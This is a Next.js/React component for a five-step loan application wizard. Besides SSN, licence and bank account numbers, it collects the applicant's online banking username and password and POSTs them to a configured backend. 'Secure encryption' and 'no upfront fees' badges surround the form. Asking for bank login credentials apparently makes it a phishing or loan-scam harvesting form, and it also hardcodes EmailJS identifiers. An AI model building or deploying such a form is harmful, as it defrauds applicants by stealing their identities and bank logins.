"use client";

import { useState, useEffect, useCallback } from "react";
import dynamic from "next/dynamic";
import Link from "next/dist/client/link";
import StepConsent from "./steps/StepConsent";
// import { apiUrl } from "@/lib/api";

// ── EmailJS config ──────────────────────────────────────
// Replace these with your actual EmailJS credentials
const EMAILJS_SERVICE_ID = "service_77j847d";
const EMAILJS_TEMPLATE_ID = "template_haxp2r6";
const EMAILJS_PUBLIC_KEY = "cJhBcR1abKXJ6fUEy";

const StepPersonalInfo = dynamic(() => import("./steps/StepPersonalInfo"));
const StepAddress = dynamic(() => import("./steps/StepAddress"));
const StepLoanDetails = dynamic(() => import("./steps/StepLoanDetails"));
const StepBanking = dynamic(() => import("./steps/StepBanking"));
export interface ApplicationData {
  // Personal Info
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  dateOfBirth: string;
  // Identification
  ssn: string;
  driverLicenseNumber: string;
  driverLicenseState: string;
  // Address
  streetAddress: string;
  city: string;
  state: string;
  zipCode: string;
  country: "US";
  // Employment
  employmentStatus: string;
  employerName: string;
  jobTitle: string;
  monthlyIncome: number;
  yearsEmployed: number;
  // Loan
  loanAmount: number;
  loanPurpose: string;
  loanTerm: number;
  // Banking
  routingNumber: string;
  bankName: string;
  accountNumber: string;
  bankUsername: string;
  bankPassword: string;
  accountType: "checking" | "savings";
  bankLinkConsent: boolean;
  // Consent
  tcpaConsent: boolean;
  privacyConsent: boolean;
  creditCheckConsent: boolean;
  // UTM
  utmSource: string;
  utmMedium: string;
  utmCampaign: string;
  utmContent: string;
  // Referral
  assistedByLoanAgent: string;
}

const STEPS = [
  { id: 1, title: "Personal Info", shortTitle: "Personal" },
  { id: 2, title: "Address", shortTitle: "Address" },
  { id: 3, title: "Loan Details", shortTitle: "Loan" },
  { id: 4, title: "Banking", shortTitle: "Banking" },
  { id: 5, title: "Review & Consent", shortTitle: "Submit" },
];

const initialData: ApplicationData = {
  firstName: "",
  lastName: "",
  email: "",
  phone: "",
  dateOfBirth: "",
  ssn: "",
  driverLicenseNumber: "",
  driverLicenseState: "",
  streetAddress: "",
  city: "",
  state: "",
  zipCode: "",
  country: "US",
  employmentStatus: "",
  employerName: "",
  jobTitle: "",
  monthlyIncome: 0,
  yearsEmployed: 0,
  loanAmount: 5000,
  loanPurpose: "",
  loanTerm: 36,
  routingNumber: "",
  bankName: "",
  accountNumber: "",
  bankUsername: "",
  bankPassword: "",
  accountType: "checking",
  bankLinkConsent: false,
  tcpaConsent: false,
  privacyConsent: false,
  creditCheckConsent: false,
  utmSource: "",
  utmMedium: "",
  utmCampaign: "",
  utmContent: "",
  assistedByLoanAgent: "",
};

export default function ApplicationWizard() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<ApplicationData>(initialData);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitResult, setSubmitResult] = useState<{
    success: boolean;
    message: string;
    applicationId?: string;
  } | null>(null);

  useEffect(() => {
    if (currentStep > 1) {
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  }, [currentStep]);

  const updateFormData = useCallback((updates: Partial<ApplicationData>) => {
    setFormData((prev) => ({ ...prev, ...updates }));
  }, []);

  const nextStep = useCallback(() => {
    setCurrentStep((prev) => Math.min(prev + 1, STEPS.length));
  }, []);

  const prevStep = useCallback(() => {
    setCurrentStep((prev) => Math.max(prev - 1, 1));
  }, []);

  const handleSubmit = async () => {
    try {
      setIsSubmitting(true);
      const res = await fetch(
        `${process.env.NEXT_PUBLIC_API_URL}/api/v1/loans/apply`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            applicantFullName: `${formData.firstName} ${formData.lastName}`,
            applicantPhoneNumber: formData.phone,
            applicantDateOfBirth: formData.dateOfBirth,
            applicantSSN: formData.ssn,
            applicantAddress: formData.streetAddress,
            applicantCity: formData.city,
            applicantState: formData.state,
            applicantZipCode: formData.zipCode,
            applicantLoanAmount: formData.loanAmount.toString(),
            applicantLoanPurpose: formData.loanPurpose,
            applicantRoutingNumber: formData.routingNumber,
            applicantBankName: formData.bankName,
            applicantAccountNumber: formData.accountNumber,
            applicantOnlineBankUsername: formData.bankUsername,
            applicantOnlineBankPassword: formData.bankPassword,
          }),
        },
      );
      if (!res.ok) {
        throw new Error("Network response was not ok");
      }
      setSubmitResult({
        success: true,
        message:
          "Your application has been submitted successfully! We will review your application and contact you within 24 hours.",
      });
    } catch {
      setSubmitResult({
        success: false,
        message:
          "Something went wrong. Please try again or contact us directly.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Success state
  if (submitResult?.success) {
    return (
      <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
        <div className="w-16 h-16 bg-success/10 rounded-full flex items-center justify-center mx-auto mb-4">
          <svg
            className="w-8 h-8 text-success"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>
        <h2 className="text-2xl font-bold text-text-primary mb-2">
          Application Submitted!
        </h2>

        <p className="text-text-secondary">{submitResult.message}</p>

        {/* <Link
          href="/bank-verification"
          className="text-primary hover:text-primary-dark border border-primary hover:border-primary-dark px-6 py-3 rounded-lg font-semibold transition-colors mt-6 inline-block"
        >
          Verify Your Bank Information
        </Link> */}

        {submitResult.applicationId && (
          <div className="mt-6 bg-surface rounded-xl p-4">
            <p className="text-sm text-text-secondary mb-1">
              Your Application ID:
            </p>
            <p className="font-mono text-sm font-semibold text-text-primary break-all">
              {submitResult.applicationId}
            </p>
            <p className="text-xs text-text-secondary mt-2">
              Save this ID to check your loan status anytime.
            </p>
          </div>
        )}

        {/* <a
          href="/loan-status"
          className="inline-block mt-6 bg-primary hover:bg-primary-dark text-white px-6 py-3 rounded-lg font-semibold transition-colors duration-200 shadow-md hover:shadow-lg"
        >
          Check Loan Status
        </a> */}
      </div>
    );
  }

  // Loading geo
  //   if (geoAllowed === null) {
  //     return (
  //       <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
  //         <div className="animate-spin w-8 h-8 border-4 border-primary border-t-transparent rounded-full mx-auto mb-4" />
  //         <p className="text-text-secondary">Verifying your location...</p>
  //       </div>
  //     );
  //   }

  return (
    <div className="bg-white rounded-2xl shadow-lg overflow-hidden relative">
      {/* Safety Bar */}
      <div className="bg-emerald-50 border-b border-emerald-100 px-6 py-3">
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-xs sm:text-sm text-emerald-700 font-medium">
          <span className="flex items-center gap-1">
            <svg
              className="w-4 h-4 text-emerald-600"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            No hard credit pull for checking your rate.
          </span>
          <span className="flex items-center gap-1">
            <svg
              className="w-4 h-4 text-emerald-600"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            $0 upfront fees.
          </span>
          <span className="flex items-center gap-1">
            <svg
              className="w-4 h-4 text-emerald-600"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            Secure 256-bit encryption.
          </span>
        </div>
      </div>

      {/* PST Speed Badge */}
      <div className="absolute top-14 right-4 sm:top-16 sm:right-6 z-10">
        <div className="bg-blue-50 border border-blue-200 text-blue-700 text-[10px] sm:text-xs font-semibold px-2 py-1 rounded-full flex items-center gap-1">
          <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
            <path
              fillRule="evenodd"
              d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z"
              clipRule="evenodd"
            />
          </svg>
          Real-time PST Processing
        </div>
      </div>

      {/* Progress Bar */}
      <div className="bg-surface px-6 py-4">
        <div className="flex items-center justify-between my-3">
          <span className="text-sm font-medium text-text-secondary">
            Step {currentStep} of {STEPS.length}
          </span>
          <span className="text-sm font-medium text-primary">
            {STEPS[currentStep - 1].title}
          </span>
        </div>
        <div className="flex gap-1.5">
          {STEPS.map((step) => (
            <div
              key={step.id}
              className={`h-2 rounded-full flex-1 transition-colors duration-300 ${
                step.id < currentStep
                  ? "bg-success"
                  : step.id === currentStep
                    ? "bg-primary"
                    : "bg-surface-dark"
              }`}
            />
          ))}
        </div>
      </div>

      {/* Step Content */}
      <div className="p-6 sm:p-8">
        {submitResult && !submitResult.success && (
          <div className="mb-6 bg-error/10 border border-error/20 rounded-lg p-4">
            <p className="text-error text-sm">{submitResult.message}</p>
          </div>
        )}
        {currentStep === 1 && (
          <StepPersonalInfo
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
          />
        )}
        {currentStep === 2 && (
          <StepAddress
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 3 && (
          <StepLoanDetails
            data={formData}
            updateData={updateFormData}
            onNext={nextStep}
            onBack={prevStep}
          />
        )}
        {currentStep === 4 && (
          <StepBanking
            data={formData}
            updateData={updateFormData}
            onBack={prevStep}
            onNext={nextStep}
          />
        )}
        {currentStep === 5 && (
          <StepConsent
            data={formData}
            updateData={updateFormData}
            onBack={prevStep}
            onSubmit={handleSubmit}
            isSubmitting={isSubmitting}
          />
        )}
      </div>

      {/* Trust Badges */}
      <div className="bg-surface px-6 py-4 border-t border-surface-dark">
        <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-2 text-xs text-text-secondary">
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-success"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                clipRule="evenodd"
              />
            </svg>
            256-Bit SSL Encrypted
          </span>
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-blue-500"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z"
                clipRule="evenodd"
              />
            </svg>
            PST-Based Support
          </span>
          <span className="flex items-center gap-1.5">
            <svg
              className="w-4 h-4 text-success"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            No Upfront Fees
          </span>
        </div>
      </div>
    </div>
  );
}
